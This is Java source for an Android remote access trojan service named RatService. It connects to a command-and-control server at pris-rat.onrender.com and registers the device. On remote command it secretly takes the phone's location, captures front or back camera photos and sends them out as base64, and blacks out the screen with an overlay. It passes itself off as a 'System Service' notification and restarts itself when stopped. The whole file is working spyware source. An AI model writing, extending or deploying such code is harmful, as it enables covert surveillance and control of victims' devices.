package com.pris.rat.tool;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import androidx.core.app.NotificationCompat;

import io.socket.client.IO;
import io.socket.client.Socket;

import org.json.JSONObject;

import java.net.URISyntaxException;
import java.util.UUID;

public class RatService extends Service {
    private static final String SERVER_URL = "https://pris-rat.onrender.com";
    private Socket socket;
    private String deviceId;
    private LocationModule locationModule;
    private CameraModule cameraModule;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = getDeviceId();
        startForeground(1, buildNotification());

        locationModule = new LocationModule(this, (lat, lon) -> {
            try {
                JSONObject resp = new JSONObject();
                resp.put("id", deviceId);
                resp.put("type", "location");
                resp.put("lat", lat);
                resp.put("lon", lon);
                if (socket != null && socket.connected()) socket.emit("response", resp);
            } catch (Exception ignored) {}
        });

        cameraModule = new CameraModule(this, base64 -> {
            try {
                JSONObject resp = new JSONObject();
                resp.put("id", deviceId);
                resp.put("type", "camera");
                resp.put("image", base64);
                if (socket != null && socket.connected()) socket.emit("response", resp);
            } catch (Exception ignored) {}
        });

        connectSocket();
    }

    private String getDeviceId() {
        String id = getSharedPreferences("pris", MODE_PRIVATE).getString("did", null);
        if (id == null) {
            id = UUID.randomUUID().toString().substring(0, 8);
            getSharedPreferences("pris", MODE_PRIVATE).edit().putString("did", id).apply();
        }
        return id;
    }

    private Notification buildNotification() {
        String CH = "pris_svc";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CH, "System", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        return new NotificationCompat.Builder(this, CH)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void connectSocket() {
        try {
            socket = IO.socket(SERVER_URL);
            socket.on(Socket.EVENT_CONNECT, args -> {
                try {
                    JSONObject reg = new JSONObject();
                    reg.put("id", deviceId);
                    reg.put("model", Build.MANUFACTURER + " " + Build.MODEL);
                    reg.put("android", Build.VERSION.RELEASE);
                    reg.put("battery", 100);
                    socket.emit("register", reg);
                } catch (Exception ignored) {}
            });

            socket.on("execute", args -> {
                try {
                    JSONObject cmd = (JSONObject) args[0];
                    String action = cmd.getString("action");
                    handleCommand(action, cmd);
                } catch (Exception ignored) {}
            });

            socket.connect();
        } catch (URISyntaxException ignored) {}
    }

    private void handleCommand(String action, JSONObject cmd) {
        switch (action) {
            case "location":
                locationModule.getLocation();
                break;
            case "camera":
                boolean front = cmd.optBoolean("front", false);
                cameraModule.capturePhoto(front);
                break;
            case "blackout":
                Intent i = new Intent(this, OverlayService.class);
                startService(i);
                break;
            case "unblackout":
                stopService(new Intent(this, OverlayService.class));
                break;
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (socket != null) socket.disconnect();
        Intent restart = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}